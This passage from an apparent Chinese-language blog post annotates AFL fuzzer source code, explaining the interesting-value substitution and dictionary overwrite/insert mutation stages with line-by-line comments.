执行替换并测试 */</span></span><br><span class="line">      stage_cur_val = interesting_8[j];</span><br><span class="line">      out_buf[i] = interesting_8[j];  <span class="comment">// 用有趣值替换当前字节</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;  <span class="comment">// 如果出错则放弃当前测试用例</span></span><br><span class="line"></span><br><span class="line">      out_buf[i] = orig;  <span class="comment">// 恢复原始值</span></span><br><span class="line">      stage_cur++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计本阶段的发现 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_INTEREST8] += new_hit_cnt - orig_hit_cnt;  <span class="comment">// 新发现的路径/崩溃</span></span><br><span class="line">  stage_cycles[STAGE_INTEREST8] += stage_max;  <span class="comment">// 执行的测试次数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*============================================</span></span><br><span class="line"><span class="comment">   * STAGE 2: 16位有趣值替换 (interest 16/8)</span></span><br><span class="line"><span class="comment">   * 遍历每个16位（2字节）位置，尝试替换为预定义的16位有趣值</span></span><br><span class="line"><span class="comment">   * 同时测试小端和大端两种字节序</span></span><br><span class="line"><span class="comment">   *============================================*/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果禁用了算术变异或文件太小，跳过 */</span></span><br><span class="line">  <span class="keyword">if</span> (no_arith || len &lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_interest;</span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;interest 16/8&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;int16&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* stage_max = 2倍（小端+大端） × 位置数 × 有趣值数量 */</span></span><br><span class="line">  stage_max = <span class="number">2</span> * (len - <span class="number">1</span>) * (<span class="keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历每个可能的16位位置（需要2个连续字节） */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u16 orig = *(u16 *)(out_buf + i);  <span class="comment">// 读取原始16位值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* === 效应图优化（16位版本） ===</span></span><br><span class="line"><span class="comment">     * 检查这2个字节是否都被标记为&quot;无效&quot;</span></span><br><span class="line"><span class="comment">     * 只有当两个字节都无效时才跳过</span></span><br><span class="line"><span class="comment">     * 原因：即使一个字节有效，16位操作也可能有意义</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)]) &#123;</span><br><span class="line">      stage_max -= <span class="keyword">sizeof</span>(interesting_16);  <span class="comment">// 小端+大端都跳过</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历所有16位有趣值 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_16) / <span class="number">2</span>; j++) &#123;</span><br><span class="line"></span><br><span class="line">      stage_cur_val = interesting_16[j];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 小端变体 ===</span></span><br><span class="line"><span class="comment">       * 去重检查（16位版本）：</span></span><br><span class="line"><span class="comment">       * 1. could_be_bitflip: 可能由位翻转产生</span></span><br><span class="line"><span class="comment">       * 2. could_be_arith: 可能由16位算术运算产生</span></span><br><span class="line"><span class="comment">       * 3. could_be_interest: 可能由8位有趣值替换产生</span></span><br><span class="line"><span class="comment">       *    例如：两个连续的8位有趣值可能组成这个16位值</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!could_be_bitflip(orig ^ (u16)interesting_16[j]) &amp;&amp;</span><br><span class="line">          !could_be_arith(orig, (u16)interesting_16[j], <span class="number">2</span>) &amp;&amp;</span><br><span class="line">          !could_be_interest(orig, (u16)interesting_16[j], <span class="number">2</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        stage_val_type = STAGE_VAL_LE;  <span class="comment">// 标记为小端</span></span><br><span class="line"></span><br><span class="line">        *(u16 *)(out_buf + i) = interesting_16[j];  <span class="comment">// 小端写入</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        stage_max--;  <span class="comment">// 跳过则减少计数</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 大端变体 ===</span></span><br><span class="line"><span class="comment">       * 额外条件：只有当大端值与小端值不同时才测试</span></span><br><span class="line"><span class="comment">       * 例如：0x0100 的大端和小端是不同的</span></span><br><span class="line"><span class="comment">       *       0x0101 的大端和小端是相同的（回文），无需重复测试</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> ((u16)interesting_16[j] != SWAP16(interesting_16[j]) &amp;&amp;</span><br><span class="line">          !could_be_bitflip(orig ^ SWAP16(interesting_16[j])) &amp;&amp;</span><br><span class="line">          !could_be_arith(orig, SWAP16(interesting_16[j]), <span class="number">2</span>) &amp;&amp;</span><br><span class="line">          !could_be_interest(orig, SWAP16(interesting_16[j]), <span class="number">2</span>, <span class="number">1</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        stage_val_type = STAGE_VAL_BE;  <span class="comment">// 标记为大端</span></span><br><span class="line"></span><br><span class="line">        *(u16 *)(out_buf + i) = SWAP16(interesting_16[j]);  <span class="comment">// 大端写入</span></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        stage_max--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(u16 *)(out_buf + i) = orig;  <span class="comment">// 恢复原始16位值</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计16位阶段的发现 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_INTEREST16] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_INTEREST16] += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 文件太小，无法进行32位操作 */</span></span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_interest;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*============================================</span></span><br><span class="line"><span class="comment">   * STAGE 3: 32位有趣值替换 (interest 32/8)</span></span><br><span class="line"><span class="comment">   * 遍历每个32位（4字节）位置，尝试替换为预定义的32位有趣值</span></span><br><span class="line"><span class="comment">   * 同时测试小端和大端两种字节序</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 逻辑与16位阶段完全相同，只是处理的是32位值</span></span><br><span class="line"><span class="comment">   *============================================*/</span></span><br><span class="line">  </span><br><span class="line">  stage_name = <span class="string">&quot;interest 32/8&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;int32&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  stage_max = <span class="number">2</span> * (len - <span class="number">3</span>) * (<span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历每个可能的32位位置（需要4个连续字节） */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 orig = *(u32 *)(out_buf + i);  <span class="comment">// 读取原始32位值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* === 效应图优化（32位版本） ===</span></span><br><span class="line"><span class="comment">     * 检查这4个字节是否都被标记为&quot;无效&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)] &amp;&amp;</span><br><span class="line">        !eff_map[EFF_APOS(i + <span class="number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">3</span>)]) &#123;</span><br><span class="line">      stage_max -= <span class="keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历所有32位有趣值 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_32) / <span class="number">4</span>; j++) &#123;</span><br><span class="line"></span><br><span class="line">      stage_cur_val = interesting_32[j];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 小端变体（32位） ===</span></span><br><span class="line"><span class="comment">       * 去重检查：</span></span><br><span class="line"><span class="comment">       * 1. could_be_bitflip: 位翻转</span></span><br><span class="line"><span class="comment">       * 2. could_be_arith: 32位算术运算</span></span><br><span class="line"><span class="comment">       * 3. could_be_interest: 16位有趣值组合</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!could_be_bitflip(orig ^ (u32)interesting_32[j]) &amp;&amp;</span><br><span class="line">          !could_be_arith(orig, interesting_32[j], <span class="number">4</span>) &amp;&amp;</span><br><span class="line">          !could_be_interest(orig, interesting_32[j], <span class="number">4</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">        *(u32 *)(out_buf + i) = interesting_32[j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        stage_max--;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 大端变体（32位） === */</span></span><br><span class="line">      <span class="keyword">if</span> ((u32)interesting_32[j] != SWAP32(interesting_32[j]) &amp;&amp;</span><br><span class="line">          !could_be_bitflip(orig ^ SWAP32(interesting_32[j])) &amp;&amp;</span><br><span class="line">          !could_be_arith(orig, SWAP32(interesting_32[j]), <span class="number">4</span>) &amp;&amp;</span><br><span class="line">          !could_be_interest(orig, SWAP32(interesting_32[j]), <span class="number">4</span>, <span class="number">1</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        stage_val_type = STAGE_VAL_BE;</span><br><span class="line"></span><br><span class="line">        *(u32 *)(out_buf + i) = SWAP32(interesting_32[j]);</span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        stage_max--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(u32 *)(out_buf + i) = orig;  <span class="comment">// 恢复原始32位值</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计32位阶段的发现 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_INTEREST32] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_INTEREST32] += stage_max;</span><br></pre></td></tr></table></figure><h3 id="字典替换阶段"><a href="#字典替换阶段" class="headerlink" title="字典替换阶段"></a>字典替换阶段</h3><p>这部分有两大类情况，一种是用户提供的一种是程序自动生成的，我们这里先看用户提供的部分，这部分有两种方法，一种是覆盖一种是插入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">skip_interest:</span><br><span class="line">  <span class="comment">/********************</span></span><br><span class="line"><span class="comment">   * 字典替换阶段（Dictionary Substitution Stage）</span></span><br><span class="line"><span class="comment">   * 使用用户提供的字典或自动检测的token来变异输入</span></span><br><span class="line"><span class="comment">   * 分为两种模式：覆写（overwrite）和插入（insert）</span></span><br><span class="line"><span class="comment">   ********************/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果没有字典条目，跳过整个字典替换阶段 */</span></span><br><span class="line">  <span class="keyword">if</span> (!extras_cnt)</span><br><span class="line">    <span class="keyword">goto</span> skip_user_extras;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 模式1：覆写模式（Overwrite） ========== */</span></span><br><span class="line">  <span class="comment">/* 用字典中的token替换输入数据中的某段内容 */</span></span><br><span class="line">  stage_name = <span class="string">&quot;user extras (over)&quot;</span>;  <span class="comment">// 阶段名称</span></span><br><span class="line">  stage_short = <span class="string">&quot;ext_UO&quot;</span>;              <span class="comment">// 阶段简称（User Overwrite）</span></span><br><span class="line">  stage_cur = <span class="number">0</span>;                       <span class="comment">// 当前执行的测试用例编号</span></span><br><span class="line">  stage_max = extras_cnt * len;        <span class="comment">// 最大测试用例数（字典条目数 × 输入长度）</span></span><br><span class="line">  stage_val_type = STAGE_VAL_NONE;     <span class="comment">// 该阶段不使用特定的值类型</span></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;          <span class="comment">// 记录本阶段开始时的发现数（用于统计）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 外层循环：遍历输入缓冲区的每个字节位置 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u32 last_len = <span class="number">0</span>;  <span class="comment">// 记录最后一次写入的token长度，用于后续恢复</span></span><br><span class="line">    stage_cur_byte = i;  <span class="comment">// 当前正在处理的字节位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 内层循环：尝试所有字典条目</span></span><br><span class="line"><span class="comment">     * 注意：字典条目已按大小排序（从小到大）</span></span><br><span class="line"><span class="comment">     * 好处：在同一位置i处，后续写入会覆盖前面的写入，</span></span><br><span class="line"><span class="comment">     *       所以不需要在每次写入前恢复缓冲区 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* ========== 跳过条件判断（性能优化和有效性检查） ========== */</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 条件1：概率性跳过（当字典太大时）</span></span><br><span class="line"><span class="comment">       * 如果字典条目数 &gt; MAX_DET_EXTRAS，则随机跳过一些条目</span></span><br><span class="line"><span class="comment">       * UR(extras_cnt)生成[0, extras_cnt)的随机数</span></span><br><span class="line"><span class="comment">       * 这样可以控制测试数量，避免字典过大导致的性能问题 */</span></span><br><span class="line">      <span class="keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;= MAX_DET_EXTRAS) ||</span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 条件2：长度检查</span></span><br><span class="line"><span class="comment">           * token长度超过从当前位置i到结尾的剩余空间</span></span><br><span class="line"><span class="comment">           * 例如：len=10, i=8, extras[j].len=5，则5 &gt; 10-8，跳过 */</span></span><br><span class="line">          extras[j].len &gt; len - i ||</span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 条件3：冗余检查</span></span><br><span class="line"><span class="comment">           * 如果token内容与当前位置的内容完全相同，跳过</span></span><br><span class="line"><span class="comment">           * 因为替换后不会产生任何变化，是无效的变异 */</span></span><br><span class="line">          !<span class="built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 条件4：效应图（effector map）检查</span></span><br><span class="line"><span class="comment">           * 检查从位置i开始、长度为extras[j].len的范围</span></span><br><span class="line"><span class="comment">           * 如果这个范围内没有任何有效字节（eff_map中全为0），则跳过</span></span><br><span class="line"><span class="comment">           * 有效字节：在之前的位翻转阶段被证明能影响程序行为的字节</span></span><br><span class="line"><span class="comment">           * EFF_APOS(i): 获取效应图中的偏移</span></span><br><span class="line"><span class="comment">           * EFF_SPAN_ALEN(i, len): 计算跨度长度</span></span><br><span class="line"><span class="comment">           * memchr(..., 1, ...): 在范围内查找是否有标记为1（有效）的字节 */</span></span><br><span class="line">          !<span class="built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="number">1</span>, EFF_SPAN_ALEN(i, extras[j].len))) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 满足任一跳过条件，减少stage_max计数并跳过本次测试 */</span></span><br><span class="line">        stage_max--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 记录本次写入的token长度 */</span></span><br><span class="line">      last_len = extras[j].len;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 将字典token覆写到out_buf的位置i</span></span><br><span class="line"><span class="comment">       * 例如：out_buf=&quot;ABCDEFGH&quot;, i=2, token=&quot;XYZ&quot;</span></span><br><span class="line"><span class="comment">       *       结果：out_buf=&quot;ABXYZFGH&quot; */</span></span><br><span class="line">      <span class="built_in">memcpy</span>(out_buf + i, extras[j].data, last_len);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 执行模糊测试：用变异后的out_buf运行目标程序</span></span><br><span class="line"><span class="comment">       * 如果发现致命错误或需要放弃当前输入，跳转到abandon_entry */</span></span><br><span class="line">      <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">      stage_cur++;  <span class="comment">// 增加已执行的测试用例计数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复被覆写的内存</span></span><br><span class="line"><span class="comment">     * 将原始输入in_buf中对应的数据恢复到out_buf</span></span><br><span class="line"><span class="comment">     * 注意：这里使用last_len，因为字典已排序，last_len是最大的</span></span><br><span class="line"><span class="comment">     * 所以恢复last_len长度就能完全恢复所有被修改的内容 */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计本阶段的发现</span></span><br><span class="line"><span class="comment">   * new_hit_cnt = 新发现的路径数 + 新发现的崩溃数 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_EXTRAS_UO] += new_hit_cnt - orig_hit_cnt;  <span class="comment">// 记录本阶段的新发现</span></span><br><span class="line">  stage_cycles[STAGE_EXTRAS_UO] += stage_max;                   <span class="comment">// 记录本阶段的执行次数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 模式2：插入模式（Insert） ========== */</span></span><br><span class="line">  <span class="comment">/* 在输入数据的某个位置插入字典token，原有数据后移 */</span></span><br><span class="line">  stage_name = <span class="string">&quot;user extras (insert)&quot;</span>;  <span class="comment">// 阶段名称</span></span><br><span class="line">  stage_short = <span class="string">&quot;ext_UI&quot;</span>;                <span class="comment">// 阶段简称（User Insert）</span></span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  stage_max = extras_cnt * (len + <span class="number">1</span>);    <span class="comment">// 注意：是len+1，因为可以在末尾插入</span></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 分配临时缓冲区，大小为原始长度+最大字典条目长度</span></span><br><span class="line"><span class="comment">   * 用于存储插入token后的新数据 */</span></span><br><span class="line">  ex_tmp = ck_alloc(len + MAX_DICT_FILE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 外层循环：遍历所有可能的插入位置（包括末尾）</span></span><br><span class="line"><span class="comment">   * i=0: 在开头插入</span></span><br><span class="line"><span class="comment">   * i=len: 在末尾插入 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 内层循环：尝试插入每个字典条目 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 长度限制检查：插入后的总长度不能超过MAX_FILE */</span></span><br><span class="line">      <span class="keyword">if</span> (len + extras[j].len &gt; MAX_FILE) &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 构造新的测试输入（三部分拼接）：</span></span><br><span class="line"><span class="comment">       * </span></span><br><span class="line"><span class="comment">       * 原始数据: [0 ... i-1] [i ... len-1]</span></span><br><span class="line"><span class="comment">       * 插入后:   [0 ... i-1] [token] [i ... len-1]</span></span><br><span class="line"><span class="comment">       * </span></span><br><span class="line"><span class="comment">       * 注意：此时ex_tmp的前i个字节已经在之前的循环迭代中复制好了</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 第1部分：插入token到位置i</span></span><br><span class="line"><span class="comment">       * 例如：原始=&quot;ABCD&quot;, i=2, token=&quot;XYZ&quot;</span></span><br><span class="line"><span class="comment">       *       ex_tmp[2..4] = &quot;XYZ&quot; */</span></span><br><span class="line">      <span class="built_in">memcpy</span>(ex_tmp + i, extras[j].data, extras[j].len);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 第2部分：复制原始数据的尾部（从位置i开始到结尾）</span></span><br><span class="line"><span class="comment">       * 将原始数据的[i, len)部分复制到token之后</span></span><br><span class="line"><span class="comment">       * 继续上例：ex_tmp[5..6] = &quot;CD&quot;</span></span><br><span class="line"><span class="comment">       * 最终：ex_tmp = &quot;AB&quot; + &quot;XYZ&quot; + &quot;CD&quot; = &quot;ABXYZCD&quot; */</span></span><br><span class="line">      <span class="built_in">memcpy</span>(ex_tmp + i + extras[j].len, out_buf + i, len - i);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 执行模糊测试，使用新长度 len + extras[j].len */</span></span><br><span class="line">      <span class="keyword">if</span> (common_fuzz_stuff(argv, ex_tmp, len + extras[j].len)) &#123;</span><br><span class="line">        ck_free(ex_tmp);  <span class="comment">// 发生错误时释放临时缓冲区</span></span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      stage_cur++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 逐步构建ex_tmp的头部</span></span><br><span class="line"><span class="comment">     * 在下一次i循环前，将out_buf[i]复制到ex_tmp[i]</span></span><br><span class="line"><span class="comment">     * 这样ex_tmp的[0, i]部分始终与原始数据保持一致</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 循环过程示例（out_buf=&quot;ABCD&quot;, token=&quot;X&quot;）：</span></span><br><span class="line"><span class="comment">     * i=0: ex_tmp未初始化 -&gt; 插入后测试&quot;XABCD&quot; -&gt; ex_tmp[0]=&#x27;A&#x27;</span></span><br><span class="line"><span class="comment">     * i=1: ex_tmp=&quot;A????&quot; -&gt; 插入后测试&quot;AXBCD&quot; -&gt; ex_tmp[1]=&#x27;B&#x27;</span></span><br><span class="line"><span class="comment">     * i=2: ex_tmp=&quot;AB???&quot; -&gt; 插入后测试&quot;ABXCD&quot; -&gt; ex_tmp[2]=&#x27;C&#x27;</span></span><br><span class="line"><span class="comment">     * i=3: ex_tmp=&quot;ABC??&quot; -&gt; 插入后测试&quot;ABCXD&quot; -&gt; ex_tmp[3]=&#x27;D&#x27;</span></span><br><span class="line"><span class="comment">     * i=4: ex_tmp=&quot;ABCD?&quot; -&gt; 插入后测试&quot;ABCDX&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ex_tmp[i] = out_buf[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 释放临时缓冲区 */</span></span><br><span class="line">  ck_free(ex_tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计本阶段的发现 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_EXTRAS_UI] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_EXTRAS_UI] += stage_max;</span><br></pre></td></tr></table></figure><p>覆盖和之前的还不太一样这里只对之前测试无效字节做了优化跳过，没有像之前一样做测试，而插入完全没有做任何的防止重复的检查，毕竟插入的只有这一种嘛。</p><p>而自动生成的token基本上都是直接覆盖，其他没太多差别</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">skip_user_extras:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果没有自动检测字典条目，跳过 */</span></span><br><span class="line">  <span class="keyword">if</span> (!a_extras_cnt)</span><br><span class="line">    <span class="keyword">goto</span> skip_extras;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/********************</span></span><br><span class="line"><span class="comment">   * 自动检测字典的覆写模式</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 自动字典：AFL运行时自动收集的程序常量</span></span><br><span class="line"><span class="comment">   * - 来自比较指令（如 if (x == 0x1234)）</span></span><br><span class="line"><span class="comment">   * - 来自内存访问偏移</span></span><br><span class="line"><span class="comment">   * 只有覆写模式，没有插入模式（插入常量通常无意义）</span></span><br><span class="line"><span class="comment">   ********************/</span></span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;auto extras (over)&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;ext_AO&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* 只使用前 USE_AUTO_EXTRAS 个条目，避免自动字典过大 */</span></span><br><span class="line">  stage_max = MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len;</span><br><span class="line">  stage_val_type = STAGE_VAL_NONE;</span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历输入的每个字节位置 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u32 last_len = <span class="number">0</span>;</span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历前 USE_AUTO_EXTRAS 个自动字典条目 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MIN(a_extras_cnt, USE_AUTO_EXTRAS); j++) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 跳过条件：</span></span><br><span class="line"><span class="comment">       * 1. token长度超过剩余空间</span></span><br><span class="line"><span class="comment">       * 2. token内容与当前位置相同（冗余）</span></span><br><span class="line"><span class="comment">       * 3. 该范围在效应图中无有效字节 */</span></span><br><span class="line">      <span class="keyword">if</span> (a_extras[j].len &gt; len - i ||</span><br><span class="line">          !<span class="built_in">memcmp</span>(a_extras[j].data, out_buf + i, a_extras[j].len) ||</span><br><span class="line">          !<span class="built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="number">1</span>,</span><br><span class="line">                  EFF_SPAN_ALEN(i, a_extras[j].len))) &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      last_len = a_extras[j].len;</span><br><span class="line">      <span class="comment">/* 用自动检测的token覆写当前位置 */</span></span><br><span class="line">      <span class="built_in">memcpy</span>(out_buf + i, a_extras[j].data, last_len);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 执行测试 */</span></span><br><span class="line">      <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">      stage_cur++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复原始数据（last_len是最大覆写长度） */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计本阶段的发现 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_EXTRAS_AO] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_EXTRAS_AO] += 